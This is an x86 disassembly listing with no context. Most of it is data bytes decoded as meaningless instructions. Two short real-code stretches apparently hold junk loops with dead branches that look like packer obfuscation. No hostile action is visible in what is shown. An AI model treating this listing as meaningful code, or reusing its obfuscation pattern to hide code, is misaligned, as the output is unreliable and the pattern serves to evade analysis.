  4059fb:	shl    BYTE PTR [ecx],cl
  4059fd:	rcr    DWORD PTR [ebx-0x4a],cl
  405a00:	popf   
  405a01:	mov    eax,?
  405a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a04:	std    
  405a05:	xor    ebx,edi
  405a07:	xchg   BYTE PTR [ebp-0x1d],ah
  405a0a:	sar    DWORD PTR [eax+0x1d],0x9d
  405a0e:	sbb    BYTE PTR ds:0x586791aa,bh
  405a14:	js     0x405a2b
  405a16:	nop
  405a17:	pop    ss
  405a18:	leave  
  405a19:	xchg   ebp,eax
  405a1a:	mov    bh,0x33
  405a1c:	cli    
  405a1d:	(bad)  
  405a1e:	stc    
  405a1f:	or     al,0x9a
  405a21:	xchg   bl,dh
  405a23:	iret   
  405a24:	sbb    al,0x7e
  405a26:	xchg   BYTE PTR [ebx+0x7a22ff6c],ch
  405a2c:	mov    al,ds:0x70282662
  405a31:	inc    esp
  405a32:	cmp    ecx,DWORD PTR [ecx+0x6]
  405a35:	mov    bh,0x40
  405a37:	mov    al,0x19
  405a39:	pop    ebp
  405a3a:	fidivr WORD PTR [ecx]
  405a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a3d:	add    BYTE PTR [eax-0xc44bfc],al
  405a43:	push   ds
  405a44:	cmp    al,0x74
  405a46:	div    ch
  405a48:	and    al,0x15
  405a4a:	das    
  405a4b:	nop
  405a4c:	lahf   
  405a4d:	les    edi,FWORD PTR [esp+esi*4+0xd]
  405a51:	or     DWORD PTR [ebp-0x19],ecx
  405a54:	mov    eax,ds:0x732e7b7d
  405a59:	fs mov edx,0xa01c3733
  405a5f:	cmp    BYTE PTR [eax],bh
  405a61:	adc    BYTE PTR [ebp+0x33],cl
  405a64:	lds    eax,FWORD PTR [ebp-0x7172b471]
  405a6a:	test   DWORD PTR [edi],esi
  405a6c:	daa    
  405a6d:	pop    eax
  405a6e:	pop    ebx
  405a6f:	scas   eax,DWORD PTR es:[edi]
  405a70:	test   eax,0xe8af94df
  405a75:	jmp    0xada6:0x78f90b73
  405a7c:	lds    ecx,FWORD PTR [edx]
  405a7e:	jae    0x405a14
  405a80:	mov    dl,0x4a
  405a82:	xlat   BYTE PTR ds:[ebx]
  405a83:	adc    ah,BYTE PTR [edi+0x772cd1e4]
  405a89:	pop    edi
  405a8a:	pop    ebp
  405a8b:	int3   
  405a8c:	jmp    0x4b516cbf
  405a91:	sub    ebx,DWORD PTR [ebx]
  405a93:	mov    ds:0x9fe8b89e,al
  405a98:	jo     0x405a98
  405a9a:	xchg   edi,eax
  405a9b:	std    
  405a9c:	xchg   esi,eax
  405a9d:	lahf   
  405a9e:	push   0x48870a9b
  405aa3:	mov    ecx,0x8893a33
  405aa8:	xchg   DWORD PTR ds:0x6309d561,edi
  405aae:	mov    DWORD PTR [ebx+0x6d7c87ab],esi
  405ab4:	sub    al,0x9a
  405ab6:	pop    ecx
  405ab7:	and    esp,esi
  405ab9:	push   eax
  405aba:	outs   dx,DWORD PTR ds:[esi]
  405abb:	sub    al,0x4a
  405abd:	sbb    BYTE PTR [eax-0x7d],ch
  405ac0:	mov    ah,0x55
  405ac2:	jnp    0x405a66
  405ac4:	stos   DWORD PTR es:[edi],eax
  405ac5:	inc    edi
  405ac6:	sub    BYTE PTR [edx+0xbf044c5],cl
  405acc:	add    al,0x21
  405ace:	scas   al,BYTE PTR es:[edi]
  405acf:	mov    dh,0xba
  405ad1:	js     0x405a86
  405ad3:	mov    WORD PTR [ebx+0x34],es
  405ad6:	push   edx
  405ad7:	call   0x51f3:0xd735080b
  405ade:	jmp    0x405b2c
  405ae0:	outs   dx,BYTE PTR ds:[esi]
  405ae1:	or     BYTE PTR [edx],ch
  405ae3:	outs   dx,BYTE PTR ds:[esi]
  405ae4:	push   eax
  405ae5:	lea    ebp,[edx-0x4a0961c9]
  405aeb:	sti    
  405aec:	jecxz  0x405ad9
  405aee:	lods   eax,DWORD PTR ds:[esi]
  405aef:	(bad)
  405af3:	push   ebp
  405af4:	xchg   esi,eax
  405af5:	push   esi
  405af6:	adc    al,0x75
  405af8:	out    dx,al
  405af9:	mov    bh,0x4e
  405afb:	dec    eax
  405afc:	je     0x405b45
  405afe:	xchg   DWORD PTR [ecx+0x39615388],edi
  405b04:	imul   ecx,DWORD PTR [eax+0x4e],0x1a
  405b08:	mov    WORD PTR [eax+0x48d2b093],?
  405b0e:	lock dec esp
  405b10:	inc    eax
  405b11:	adc    al,0xd3
  405b13:	jo     0x405b1c
  405b15:	pop    ebp
  405b16:	jecxz  0x405b5c
  405b18:	je     0x405abc
  405b1a:	add    eax,0xe5b42e41
  405b1f:	int    0x75
  405b21:	mov    dh,0x1d
  405b23:	fs mov ecx,0x8c6094e1
  405b29:	mov    esi,0x6e4a8c94
  405b2e:	rcl    DWORD PTR [edi+0x4e],0x42
  405b32:	je     0x405b69
  405b34:	xchg   BYTE PTR [ebx+edi*4],dh
  405b37:	mov    eax,0x850ee798
  405b3c:	sbb    BYTE PTR ds:0xf059f2be,al
  405b42:	pop    ss
  405b43:	add    eax,0xc75604e9
  405b48:	mov    ds:0xab9484bc,eax
  405b4d:	cld    
  405b4e:	rcr    DWORD PTR [ebp-0x75],1
  405b51:	or     eax,0xf7767511
  405b56:	jg     0x405b10
  405b58:	in     eax,0xed
  405b5a:	mov    al,ds:0xb4342b8e
  405b5f:	ja     0x405bd3
  405b61:	pop    ds
  405b62:	ins    DWORD PTR es:[edi],dx
  405b63:	sahf   
  405b64:	call   0xd9a1:0x8e2c8fb7
  405b6b:	pop    ecx
  405b6c:	fld    st(7)
  405b6e:	fist   DWORD PTR [edi-0x5c]
  405b71:	xor    bl,bh
  405b73:	dec    esp
  405b74:	sbb    eax,0x5bdf7f51
  405b79:	mov    al,0xa8
  405b7c:	xchg   DWORD PTR [ebx],ebx
  405b7e:	in     al,dx
  405b7f:	push   ds
  405b80:	imul   ebp,DWORD PTR [esi-0x68],0x82d7a907
  405b87:	sub    bl,BYTE PTR [ebx+0x21]
  405b8a:	popf   
  405b8b:	js     0x405b8c
  405b8d:	lahf   
  405b8e:	pop    ds
  405b8f:	or     BYTE PTR [eax-0x6b],bl
  405b92:	popa   
  405b93:	fmul   st(4),st
  405b95:	jbe    0x405b37
  405b97:	add    BYTE PTR [ecx-0x3afb405],dh
  405b9d:	clc    
  405b9e:	cwde   
  405b9f:	jno    0x405bfd
  405ba1:	(bad)  
  405ba2:	mov    al,0xc1
  405ba4:	lods   al,BYTE PTR ds:[esi]
  405ba5:	repz imul BYTE PTR [ecx+0x3db49cf7]
  405bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bad:	mov    ebp,0x5abdc4a6
  405bb2:	jl     0x405c2f
  405bb4:	sub    eax,0xa092e3a5
  405bb9:	hlt    
  405bba:	aad    0xea
  405bbc:	mov    ecx,0x59154cfd
  405bc1:	enter  0xbf63,0x6b
  405bc5:	or     DWORD PTR [esi-0x1e],0x37b0a79e
  405bcc:	inc    eax
  405bcd:	push   es
  405bce:	adc    BYTE PTR [eax],ch
  405bd0:	adc    al,0xc7
  405bd2:	dec    ecx
  405bd3:	adc    eax,0xa85f8d6a
  405bd8:	das    
  405bd9:	lods   al,BYTE PTR ds:[esi]
  405bda:	pushf  
  405bdb:	outs   dx,BYTE PTR ds:[esi]
  405bdc:	xchg   ecx,eax
  405bdd:	xor    DWORD PTR [edi+eiz*4-0x61],eax
  405be1:	das    
  405be2:	adc    eax,ebp
  405be4:	in     al,0xad
  405be6:	adc    DWORD PTR [ebx+0x78],0xffffffc3
  405bea:	adc    DWORD PTR [edi+0x18],ebp
  405bed:	rcr    BYTE PTR [edx+eiz*4-0x13e6577],cl
  405bf4:	inc    edi
  405bf5:	jo     0x405bd9
  405bf7:	pop    ebp
  405bf8:	aam    0x27
  405bfa:	test   al,0x6c
  405bfc:	sub    DWORD PTR [ebx-0x5b873f26],eax
  405c02:	out    dx,eax
  405c03:	pop    ebx
  405c04:	int3   
  405c05:	pop    eax
  405c06:	(bad)  
  405c08:	mov    ds:0xc3b99e90,al
  405c0d:	into   
  405c0e:	adc    eax,0x1cdb2981
  405c13:	das    
  405c14:	mov    esi,0x598b6c47
  405c19:	xchg   ebp,eax
  405c1a:	pop    ds
  405c1b:	js     0x405bfa
  405c1d:	nop
  405c1e:	ror    edi,cl
  405c20:	imul   edx,DWORD PTR [ebp+0x61],0x1013080
  405c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c28:	retf   0x420
  405c2b:	cwde   
  405c2c:	jl     0x405baf
  405c2e:	jg     0x405c92
  405c30:	(bad)  
  405c31:	(bad)  [ecx+ebx*4+0x32]
  405c35:	and    al,0xaa
  405c37:	mov    edx,0xa69cefc7
  405c3c:	pop    ebp
  405c3d:	test   al,0xcf
  405c3f:	stc    
  405c40:	inc    eax
  405c41:	jbe    0x405c86
  405c43:	daa    
  405c44:	push   0xd77c6086
  405c49:	ret    
  405c4a:	mov    al,ds:0x5f813c4
  405c4f:	jmp    0xa491:0x9dca44b5
  405c56:	xchg   bh,ah
  405c58:	sbb    BYTE PTR [ebx],dh
  405c5a:	mov    al,ds:0x7a389b59
  405c5f:	xor    al,0x5d
  405c61:	repz push 0xffffffc2
  405c64:	xor    bh,BYTE PTR [esi]
  405c66:	mov    ch,dl
  405c68:	and    ch,BYTE PTR [ebp+0x35f0771]
  405c6e:	mov    fs,WORD PTR [esi]
  405c70:	call   FWORD PTR ds:0x7ed7a715
  405c76:	mov    BYTE PTR [ebx-0x22e326a3],al
  405c7c:	xor    eax,0xad8ca76c
  405c81:	cmp    ebx,DWORD PTR [ebp-0x493b9f62]
  405c87:	and    ebx,eax
  405c89:	icebp  
  405c8a:	dec    ecx
  405c8b:	fidiv  WORD PTR [esi]
  405c8d:	jmp    0x79d988a5
  405c92:	retf   0xe508
  405c95:	arpl   WORD PTR [ecx+0x7e],bp
  405c98:	push   ebp
  405c99:	dec    ecx
  405c9a:	cld    
  405c9b:	jnp    0x405c92
  405c9d:	push   edx
  405c9e:	popf   
  405c9f:	pop    ebx
  405ca0:	mov    dl,dl
  405ca2:	inc    esi
  405ca3:	sub    BYTE PTR ds:0xba048945,ah
  405ca9:	sub    eax,0x532b11
  405cae:	add    BYTE PTR [ebp+0x27dae960],dl
  405cb4:	push   esi
  405cb5:	aas    
  405cb6:	jnp    0x405cbe
  405cb8:	imul   ecx,DWORD PTR [ebx-0x15aa4579],0x853f3857
  405cc2:	pop    ss
  405cc3:	loopne 0x405c82
  405cc5:	jmp    0x405cb5
  405cc7:	test   bh,al
  405cc9:	cmp    ecx,eax
  405ccb:	jne    0x4060e3
  405cd1:	add    DWORD PTR ds:0x4346bf,edx
  405cd7:	mov    ax,WORD PTR [ebp-0x8]
  405cdb:	and    DWORD PTR ds:0x4346d3,0x4346fb
  405ce5:	mov    ecx,0x8a38
  405cea:	sub    DWORD PTR ds:0x43478f,0x30d0
  405cf4:	xor    ax,cx
  405cf7:	or     ecx,0x3ba0
  405cfd:	mov    ecx,0x3afe
  405d02:	and    DWORD PTR ds:0x434747,0x6a78
  405d0c:	add    ax,cx
  405d0f:	mov    DWORD PTR ds:0x4346c7,0x12
  405d19:	cmp    DWORD PTR ds:0x4346c7,0x0
  405d20:	je     0x405d51
  405d26:	cmp    DWORD PTR ds:0x4346c7,0x13
  405d2d:	jne    0x405d3f
  405d33:	push   DWORD PTR [ebp-0x1c]
  405d36:	push   DWORD PTR [ebp-0x10]
  405d39:	call   DWORD PTR ds:0x413284
  405d3f:	mov    ecx,DWORD PTR ds:0x4346c7
  405d45:	dec    ecx
  405d46:	mov    DWORD PTR ds:0x4346c7,ecx
  405d4c:	jmp    0x405d19
  405d51:	mov    ecx,DWORD PTR [ebp+0x8]
  405d54:	movzx  eax,ax
  405d57:	not    eax
  405d59:	and    eax,DWORD PTR [ecx]
  405d5b:	mov    ecx,DWORD PTR [ebp+0x8]
  405d5e:	mov    DWORD PTR [ecx],eax
  405d60:	jmp    0x405d6c
  405d65:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  405d6c:	mov    ax,WORD PTR [ebp-0x8]
  405d70:	push   DWORD PTR [ebp+0x8]
  405d73:	call   0x4060e7
  405d78:	test   eax,eax
  405d7a:	jmp    0x4060dd
  405d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d80:	jb     0x405db6
  405d82:	push   ebp
  405d83:	cld    
  405d84:	pop    ebp
  405d85:	gs jae 0x405d28
  405d88:	call   0xad5f1bd6
  405d8d:	dec    esi
  405d8e:	jecxz  0x405d45
  405d90:	cmp    al,0x7e
  405d92:	jle    0x405d58
  405d94:	jns    0x405e14
  405d96:	jle    0x405dec
  405d98:	jb     0x405d43
  405d9a:	(bad)  
  405d9b:	aaa    
  405d9c:	sbb    al,0xd
  405d9e:	dec    esp
  405d9f:	shr    esp,1
  405da1:	es cmp eax,0xfde203af
  405da7:	bound  edx,QWORD PTR [ebx+0x53eb9257]
  405dad:	cmp    BYTE PTR [edi],bh
  405daf:	enter  0x4f37,0x1a
  405db3:	jne    0x405d6b
  405db5:	pop    esp
  405db6:	xchg   esi,eax
  405db7:	mov    edi,0xf61d1bb7
  405dbc:	mov    ebp,0xb9602178
  405dc1:	ins    DWORD PTR es:[edi],dx
  405dc2:	rol    DWORD PTR [ebx-0x3e],cl
  405dc5:	aam    0x58
  405dc7:	and    al,0x1e
  405dc9:	pop    edi
  405dca:	in     al,0xab
  405dcc:	adc    ebx,DWORD PTR [eax]
  405dce:	dec    edi
  405dcf:	lods   al,BYTE PTR ds:[esi]
  405dd0:	sar    edx,0xb3
  405dd3:	cmc    
  405dd4:	mul    DWORD PTR ds:0x1b97da65
  405dda:	dec    esi
  405ddb:	lea    edi,[esi+ecx*2]
  405dde:	hlt    
  405ddf:	sub    ecx,esp
  405de1:	sbb    esi,DWORD PTR [esi-0x6b]
  405de4:	sbb    bh,cl
  405de6:	xor    ebx,eax
  405de8:	sbb    dl,BYTE PTR [ebx+0x36]
  405deb:	popf   
  405dec:	pop    edx
  405ded:	fiadd  DWORD PTR [ebp+ecx*8-0x55bd8a1c]
  405df4:	in     al,0xdd
  405df6:	fld    QWORD PTR [ecx+0x161912e0]
  405dfc:	sbb    eax,0xf5b89c4a
  405e01:	aam    0x1
  405e03:	sub    bl,BYTE PTR [eax+0x31]
  405e06:	(bad)  
  405e07:	clc    
  405e08:	retf   0x9c94
  405e0b:	mov    ds:0xf174f6a6,al
  405e10:	outs   dx,BYTE PTR ds:[esi]
  405e11:	xchg   BYTE PTR [edi],al
  405e13:	rcl    DWORD PTR [edi-0xc53a766],cl
  405e19:	adc    eax,0x43cf9793
  405e1e:	daa    
  405e1f:	inc    edx
  405e20:	int3   
  405e21:	repz scas al,BYTE PTR es:[edi]
  405e23:	inc    edx
  405e24:	mov    al,ds:0xd8e65a5d
  405e29:	ret    
  405e2a:	les    ebx,FWORD PTR [ebx+0x74a1739e]
  405e30:	vmaxss xmm0,xmm0,DWORD PTR [edx-0x2faaaf74]
  405e38:	outs   dx,BYTE PTR ds:[esi]
  405e39:	jp     0x405de5
  405e3b:	add    BYTE PTR [edx+0x1880a750],0xdd
  405e42:	test   eax,0xcc24d637
  405e47:	in     al,0xa6
  405e49:	sub    edi,ecx
  405e4b:	cdq    
  405e4c:	div    eax
  405e4e:	repnz xchg esi,eax
  405e50:	fsubr  DWORD PTR [ebp+0xf9fe561]
  405e56:	je     0x405ec2
  405e58:	and    BYTE PTR [eax+eiz*4-0x6f6c5897],dh
  405e5f:	push   ss
  405e60:	push   es
  405e61:	leave  
  405e62:	mov    ebp,0x4736f07
  405e67:	inc    ebp
  405e68:	shl    DWORD PTR [eax+eax*1-0x6a],1
  405e6c:	fiadd  DWORD PTR [edi+0x1b]
  405e6f:	xlat   BYTE PTR ds:[ebx]
  405e70:	mov    ecx,0x3e674b17
  405e75:	inc    eax
  405e76:	loopne 0x405e91
  405e78:	mov    esi,0x2479f8e1
  405e7d:	out    0xd3,eax
  405e7f:	jl     0x405eb0
  405e81:	jne    0x405e92
  405e83:	sub    DWORD PTR [eax+0xc],0xffffffe5
  405e87:	pushf  
  405e88:	call   0xc4d26352
  405e8d:	ret    0x8050
  405e90:	jp     0x405e41
  405e92:	dec    ebx
  405e93:	push   ds
  405e94:	retf   0x9f81
  405e97:	out    dx,eax
  405e98:	cld    
  405e99:	or     eax,0x6f05111d
  405e9e:	and    eax,0xa7c568a0
  405ea3:	pop    ecx
  405ea4:	es jecxz 0x405f0a
  405ea7:	test   BYTE PTR [edi+0x647c1271],ch
  405ead:	fucomi st,st(5)
  405eaf:	in     al,dx
  405eb0:	in     eax,0xd0
  405eb2:	popa   
  405eb3:	sbb    dh,cl
  405eb5:	adc    ch,ah
  405eb7:	and    al,0xe6
  405eb9:	mov    edx,DWORD PTR [esi]
  405ebb:	mov    bh,0xef
  405ebd:	add    al,0x7d
  405ebf:	push   esp
  405ec0:	mov    cs:0x50c5f004,al
  405ec6:	xchg   ebx,eax
  405ec7:	outs   dx,BYTE PTR ds:[esi]
  405ec8:	add    eax,0xdc9d3e61
  405ecd:	pop    ebx
  405ece:	lods   eax,DWORD PTR ds:[esi]
  405ecf:	dec    DWORD PTR [ebx+0x38973200]
  405ed5:	pop    edi
  405ed6:	test   al,0x5f
  405ed8:	imul   ebx,DWORD PTR [ebp+0x46],0xffffffce
  405edc:	out    dx,al
  405edd:	xor    ebp,DWORD PTR [edx-0x33]
  405ee0:	les    ebx,FWORD PTR [ebp+0x39]
  405ee3:	cld    
  405ee4:	in     al,dx
  405ee5:	rcl    DWORD PTR [esi+0x2f],0xa2
  405ee9:	and    DWORD PTR [esi+0x2],ecx
  405eec:	xchg   ebx,eax
  405eed:	fwait
  405eee:	dec    ebx
  405eef:	int    0x7
  405ef1:	adc    ah,BYTE PTR [esi+edx*4+0x40c1b371]
  405ef8:	jp     0x405ed4
  405efa:	dec    DWORD PTR [esi-0x1d]
  405efd:	test   BYTE PTR [ebx+0x390a1ca5],dl
  405f03:	mov    eax,0x2cd0a4f8
  405f08:	dec    ecx
  405f09:	cmp    BYTE PTR [eax+0x2f87412c],dh
  405f0f:	jnp    0x405ec6
  405f11:	out    dx,eax
  405f12:	xlat   BYTE PTR ds:[ebx]
  405f13:	sub    dl,BYTE PTR [eax]
  405f15:	ja     0x405eee
  405f17:	mov    al,0xad
  405f19:	jmp    0x7bc1:0x77ea4b7c
  405f20:	dec    esi
  405f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f22:	sbb    ebx,esi
  405f24:	ret    
  405f25:	pop    esp
  405f26:	or     edx,DWORD PTR [ebp-0x1364b8b5]
  405f2c:	sbb    BYTE PTR [esi+0x4be0876],0xc7
  405f33:	xlat   BYTE PTR ds:[ebx]
  405f34:	or     edx,DWORD PTR [ebp-0x5c]
  405f37:	or     al,0xd6
  405f39:	fisttp QWORD PTR [edx+0x21850b7e]
  405f3f:	fadd   DWORD PTR fs:[eax+0x5edd2576]
  405f46:	xor    BYTE PTR [ebx-0x360f3c14],cl
  405f4c:	jge    0x405f67
  405f4e:	retf   0x5858
  405f51:	std    
  405f52:	fisttp QWORD PTR [ebp+0x28e0c517]
  405f58:	outs   dx,BYTE PTR ds:[esi]
  405f59:	js     0x405f7c
  405f5b:	inc    eax
  405f5c:	xchg   BYTE PTR [ebp+0x78],bl
  405f5f:	pop    ss
  405f60:	lds    ecx,FWORD PTR [edi]
  405f62:	fistp  DWORD PTR [edx+eax*1]
  405f65:	fild   QWORD PTR [ebx+eiz*1-0x3a60848e]
  405f6c:	imul   eax,edi,0xffffffb1
  405f6f:	cdq    
  405f70:	test   BYTE PTR [edx-0x66],bh
  405f73:	iret   
  405f74:	jecxz  0x405f18
  405f76:	mov    eax,0xd745744b
  405f7b:	popa   
  405f7c:	xchg   edi,eax
  405f7d:	pusha  
  405f7e:	lds    edi,FWORD PTR [edx+0x14]
  405f81:	in     eax,0xc1
  405f83:	xor    edi,esp
  405f85:	scas   eax,DWORD PTR es:[edi]
  405f86:	lock call 0x4478:0x969983f9
  405f8e:	jmp    0x7436:0x91d7c1fb
  405f95:	push   edx
  405f96:	jmp    0xdd24:0xd07c06df
  405f9d:	stc    
  405f9e:	mov    BYTE PTR [ecx+0x12],bl
  405fa1:	mov    esi,0x4d5f5ffb
  405fa6:	test   eax,0x1857765d
  405fab:	popa   
  405fac:	add    al,BYTE PTR [ebp+ecx*4+0x6896e08]
  405fb3:	xor    eax,0xaa8fb96
  405fb8:	scas   al,BYTE PTR es:[edi]
  405fb9:	sub    edi,DWORD PTR [edi+0x23]
  405fbc:	cmp    eax,0x554fe958
  405fc1:	imul   ecx,DWORD PTR [ebx],0xe6262afa
  405fc7:	jl     0x405f66
  405fc9:	pop    esp
  405fca:	push   eax
  405fcb:	sar    BYTE PTR [ebx],1
  405fcd:	adc    eax,0xd7271e1
  405fd2:	mov    cl,0xca
  405fd4:	call   0x6264:0x31d0d799
  405fdb:	xor    eax,0xef797eb
  405fe0:	sbb    ah,BYTE PTR [esi]
  405fe2:	je     0x405fd7
  405fe4:	sahf   
  405fe5:	fidivr WORD PTR [ebx+0x97b32b]
  405feb:	and    DWORD PTR [eax],eax
  405fed:	mov    ds:0xa1e6b131,al
  405ff2:	addr16 mov bh,0x78
  405ff5:	and    cl,BYTE PTR [ebp-0x6c9bc47a]
  405ffb:	mov    dh,cl
  405ffd:	gs fmulp st(5),st
  406000:	dec    eax
  406001:	loope  0x406017
  406003:	imul   DWORD PTR [edx-0x3a]
  406006:	mov    WORD PTR [esp+edx*8],es
  406009:	dec    esi
  40600a:	loopne 0x405fad
  40600c:	mov    BYTE PTR [edi],bh
  40600e:	pop    esi
  40600f:	pop    DWORD PTR [esi-0x4e]
  406012:	inc    ecx
  406013:	pop    esp
  406014:	inc    edi
  406015:	and    edi,edx
  406017:	out    dx,al
  406018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406019:	mov    DWORD PTR [edx],esi
  40601b:	mov    DWORD PTR [ebp+0xd8f376],0x5756d987
  406025:	repz mov ds:0x5a8be6d0,eax
  40602b:	imul   eax,DWORD PTR [ebx-0x7e],0xab959fe6
  406032:	xchg   ebx,eax
  406033:	xchg   esp,eax
  406034:	jl     0x405fbe
  406036:	out    0x16,eax
  406038:	call   DWORD PTR [ecx-0x57]
  40603b:	push   ecx
  40603c:	mov    al,0xea
  40603e:	pop    ss
  40603f:	push   cs
  406040:	or     DWORD PTR [edi+eiz*2],ebx
  406043:	mov    al,0x83
  406045:	jae    0x405fe9
  406047:	push   esp
  406048:	dec    ebx
  406049:	dec    ebp
  40604a:	das    
  40604b:	push   0x7b0c36c8
  406050:	adc    BYTE PTR [ecx-0xb],0xb6
  406054:	adc    BYTE PTR [esi-0x491834b8],bl
  40605a:	loope  0x40601e
  40605c:	and    al,0x46
  40605e:	cdq    
  40605f:	into   
  406060:	or     esp,DWORD PTR [ecx+edx*1+0x4fb19926]
  406067:	fsubr  st,st(3)
  406069:	xchg   edi,eax
  40606a:	push   ecx
  40606b:	adc    BYTE PTR [edx+esi*1-0x77486779],ch
  406072:	xchg   esp,eax
  406073:	mov    es,WORD PTR [ebp-0x63]
  406076:	aam    0xb1
  406078:	imul   esi,ecx,0x58
  40607b:	mov    bh,0x92
  40607d:	(bad)  
  40607e:	into   
  40607f:	adc    ecx,ebp
  406081:	(bad)  
  406083:	stos   DWORD PTR es:[edi],eax
  406084:	les    esi,FWORD PTR [ebx]
  406086:	dec    esi
  406087:	cld    
  406088:	push   cs
  406089:	clc    
  40608a:	xchg   edi,eax
  40608b:	pop    esi
  40608c:	xchg   edx,eax
  40608d:	dec    eax
  40608e:	lds    ecx,FWORD PTR [edx]
  406090:	cmp    esi,ecx
  406092:	dec    esi
  406093:	sbb    eax,0x13629c9b
  406098:	call   0xcd97a23e
  40609d:	pop    ecx
  40609e:	push   esi
  40609f:	fcomp  DWORD PTR [ebx-0x5c]
  4060a2:	add    esi,DWORD PTR [edx]
  4060a4:	clc    
  4060a5:	pop    ss
  4060a6:	sub    eax,0x5be73335
  4060ab:	pop    ecx
  4060ac:	rol    BYTE PTR [edi+ebp*2-0x45421824],cl
  4060b3:	(bad)  
  4060b4:	sbb    eax,0x5e33038e
  4060b9:	cld    
  4060ba:	clc    
  4060bb:	pushf  
  4060bc:	popf   
  4060bd:	jp     0x406068
  4060bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060c0:	imul   ebx,DWORD PTR [ecx+eiz*1+0x5d51b75c],0x33338aaf
  4060cb:	pusha  
  4060cc:	jns    0x406076
  4060ce:	jg     0x4060ea
  4060d0:	jle    0x406099
  4060d2:	jbe    0x4060d1
  4060d4:	cmp    al,0x41
  4060d6:	jb     0x40607b
  4060d8:	imul   ebp,DWORD PTR ds:0xffd32a2,0xfffc8284
  4060e2:	dec    ecx
  4060e4:	ret    0x4
  4060e7:	push   ebp
  4060e8:	mov    ebp,esp
  4060ea:	sub    esp,0x2c
  4060ed:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  4060f4:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  4060fb:	mov    ecx,DWORD PTR ds:0x4346ef
  406101:	mov    eax,ds:0x43479b
  406106:	sub    eax,ecx
  406108:	add    ecx,DWORD PTR [ecx+eax*1]
  40610b:	mov    eax,0x9577
  406110:	and    DWORD PTR ds:0x4346d3,0x0
  40611a:	jmp    0x40612c
  40611f:	mov    ecx,DWORD PTR ds:0x4346d3
  406125:	inc    ecx
  406126:	mov    DWORD PTR ds:0x4346d3,ecx
  40612c:	cmp    DWORD PTR ds:0x4346d3,0x15
  406133:	jae    0x40615a
  406139:	cmp    DWORD PTR ds:0x4346d3,0x17
  406140:	jne    0x40614f
  406146:	push   DWORD PTR [ebp-0x10]
  406149:	call   DWORD PTR ds:0x4130c0
  40614f:	jmp    0x40611f
  406154:	adc    DWORD PTR ds:0x4346b7,edx
  40615a:	mov    WORD PTR [ebp-0x4],ax
  40615e:	and    DWORD PTR ds:0x4346fb,0x0
  406168:	mov    ecx,DWORD PTR ds:0x4346fb
  40616e:	inc    ecx
  40616f:	mov    DWORD PTR ds:0x4346fb,ecx
  406175:	cmp    DWORD PTR ds:0x4346fb,0x5
  40617c:	jne    0x40618b
  406182:	push   DWORD PTR [ebp-0x10]
  406185:	call   DWORD PTR ds:0x4133fc
  40618b:	cmp    DWORD PTR ds:0x4346fb,0x4
  406192:	jne    0x4061a7
  406198:	xor    ecx,ecx
  40619a:	or     ecx,DWORD PTR ds:0x4346fb
  4061a0:	inc    ecx
  4061a1:	mov    DWORD PTR ds:0x4346fb,ecx
  4061a7:	cmp    DWORD PTR ds:0x4346fb,0x1f
  4061ae:	jb     0x406168
  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	call   0x738ddf27
  4061ca:	aas    
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x4061d7
  4061d2:	aam    0x14
  4061d4:	push   eax
  4061d5:	xor    ebp,DWORD PTR fs:[esi]
  4061d8:	mul    DWORD PTR [edx+0x5a]
  4061db:	xor    eax,0x6ca0a16a
  4061e0:	xor    edx,DWORD PTR [edx+edi*4-0x29]
  4061e4:	pop    esi
  4061e5:	dec    ecx
  4061e6:	pop    edi
  4061e7:	mov    BYTE PTR [eax+0x42],dl
  4061ea:	fxch   st(3)
  4061ec:	inc    esi
  4061ed:	lock jmp 0x40626c
  4061f0:	into   
  4061f1:	aad    0x1
  4061f3:	rol    DWORD PTR [edi-0x6f],1
  4061f6:	adc    BYTE PTR [edx+esi*2-0x7b8f093d],0x9e
  4061fe:	jbe    0x40618e
  406200:	mov    eax,0x66423ba9
  406205:	cmp    BYTE PTR [edx+eax*8],dh
  406208:	sbb    BYTE PTR [edx],cl
  40620a:	mov    BYTE PTR [ecx-0x5a],bl
  40620d:	jp     0x40623f
  40620f:	test   eax,0x43fc77b6
  406214:	mov    esp,0x39b2a53a
  406219:	push   0x6898c9d3
  40621e:	xor    eax,0x64c2420a
  406223:	xor    eax,0x104515ac
  406228:	shr    BYTE PTR [ecx+0x70],cl
  40622b:	retf   
  40622c:	mov    esi,0xf880e4d0
  406231:	or     eax,DWORD PTR [edi]
  406233:	xor    bl,bl
  406235:	mov    ebx,0xa4a5a566
  40623a:	dec    ebp
  40623b:	out    0xcf,eax
  40623d:	sbb    al,BYTE PTR [edi]
  40623f:	popf   
  406240:	gs xor eax,0x40fe0fbe
  406246:	mov    esp,0xea29bc37
  40624b:	dec    ecx
  40624c:	inc    eax
  40624d:	mov    ecx,0x7fcee930
  406252:	adc    BYTE PTR [esi],0x97
  406255:	int    0x65
  406257:	pop    edi
  406258:	ds dec edi
  40625a:	and    DWORD PTR [ebx+ebp*4-0x5b],esp
  40625e:	hlt    
  40625f:	and    edi,DWORD PTR [ebx+0x15]
  406262:	fisttp DWORD PTR [ecx-0x39c6837a]
  406268:	mul    DWORD PTR [ecx+0x1a]
  40626b:	push   esp
  40626c:	out    0xc0,eax
  40626e:	jns    0x4062b9
  406270:	inc    esi
  406271:	daa    
  406272:	ins    DWORD PTR es:[edi],dx
  406273:	popf   
  406274:	pushf  
  406275:	mov    fs,WORD PTR [esi]
  406277:	push   esi
  406278:	mov    eax,ds:0xea192857
  40627d:	imul   esp,esp,0xf7977792
  406283:	(bad)  
  406284:	jmp    0x40628f
  406286:	jne    0x4062d5
  406288:	arpl   WORD PTR [ebp+0x73],cx
  40628b:	or     edx,DWORD PTR [ecx]
